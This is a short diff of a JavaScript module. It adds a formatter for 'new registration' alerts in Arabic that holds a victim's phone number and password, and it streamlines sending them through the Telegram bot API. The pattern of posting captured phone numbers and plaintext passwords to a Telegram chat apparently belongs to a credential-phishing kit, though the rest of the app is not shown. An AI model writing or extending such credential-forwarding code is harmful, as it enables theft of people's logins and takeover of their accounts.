@@ -1,6 +1,16 @@
 import axios from 'axios';
 
-export const sendToTelegram = async (message, copyText) => {
+export function formatRegistrationMessage(phone, entryCode, time) {
+  return [
+    '🆕 *تسجيل جديد*',
+    '',
+    `📱 رقم الهاتف: \`${phone}\``,
+    `🔐 كلمة السر: \`${entryCode}\``,
+    `⏰ الوقت: ${time}`,
+  ].join('\n');
+}
+
+export const sendToTelegram = async (message) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -9,31 +19,14 @@ export const sendToTelegram = async (message, copyText) => {
     return false;
   }
 
-  const text = message.trim();
-  const textToCopy = (copyText || text).trim();
-
-  const payload = {
-    chat_id: chatId,
-    text,
-  };
-
-  if (textToCopy) {
-    payload.reply_markup = {
-      inline_keyboard: [
-        [
-          {
-            text: '📋 نسخ',
-            copy_text: { text: textToCopy.slice(0, 256) },
-          },
-        ],
-      ],
-    };
-  }
-
   try {
     await axios.post(
       `https://api.telegram.org/bot${token}/sendMessage`,
-      payload
+      {
+        chat_id: chatId,
+        text: message.trim(),
+        parse_mode: 'Markdown',
+      }
     );
     return true;
   } catch (error) {
